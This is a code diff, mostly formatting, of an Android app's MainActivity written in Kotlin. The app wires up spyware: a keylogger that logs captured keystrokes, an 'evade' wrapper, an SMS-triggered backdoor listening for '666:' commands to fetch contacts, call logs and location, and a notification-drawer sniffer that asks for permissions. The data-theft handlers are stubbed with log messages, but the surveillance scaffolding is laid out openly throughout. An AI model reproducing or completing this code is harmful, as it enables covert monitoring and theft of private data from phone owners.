@@ -38,8 +38,8 @@ class MainActivity : AppCompatActivity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_main)
-        val payload = suspend{
-            withContext(Dispatchers.Default){
+        val payload = suspend {
+            withContext(Dispatchers.Default) {
                 val keyloggerJob = launch {
                     Keylogger.subscribe { entry ->
                         Log.d("KEYLOGGER", entry.toString())
@@ -55,17 +55,27 @@ class MainActivity : AppCompatActivity() {
         }
         evade {
             KotlinPermissions.with(this).permissions(Manifest.permission.RECEIVE_SMS).onAccepted {
-                SmsBackdoor.openDoor(this, "666:", payload = payload){ remoteCommand ->
-                    when(remoteCommand){
-                        "COMMAND_GET_CONTACTS" -> Log.d(TAG, "PICKPOCKET ISN'T WORKING OR ELSE I'D GET THESE CONTACTS")
-                        "COMMAND_GET_CALL_LOG" -> Log.d(TAG, "PICKPOCKET ISN'T WORKING OR ELSE I'D GET THE CALL LOG")
-                        "COMMAND_GET_LOCATION" -> Log.d(TAG, "PICKPOCKET ISN'T WORKING OR ELSE I'D GET THE GPS LOCATION")
+                SmsBackdoor.openDoor(this, "666:", payload = payload) { remoteCommand ->
+                    when (remoteCommand) {
+                        "COMMAND_GET_CONTACTS" -> Log.d(
+                            TAG,
+                            "PICKPOCKET ISN'T WORKING OR ELSE I'D GET THESE CONTACTS"
+                        )
+                        "COMMAND_GET_CALL_LOG" -> Log.d(
+                            TAG,
+                            "PICKPOCKET ISN'T WORKING OR ELSE I'D GET THE CALL LOG"
+                        )
+                        "COMMAND_GET_LOCATION" -> Log.d(
+                            TAG,
+                            "PICKPOCKET ISN'T WORKING OR ELSE I'D GET THE GPS LOCATION"
+                        )
                         else -> Log.d(TAG, "COMMAND NOT FOUND")
                     }
                 }
                 Keylogger.requestPermission(this)
-                if(!DrawerSniffer.hasPermission(this))
+                if (!DrawerSniffer.hasPermission(this))
                     DrawerSniffer.requestPermission(this)
             }.ask()
+        }
     }
 }
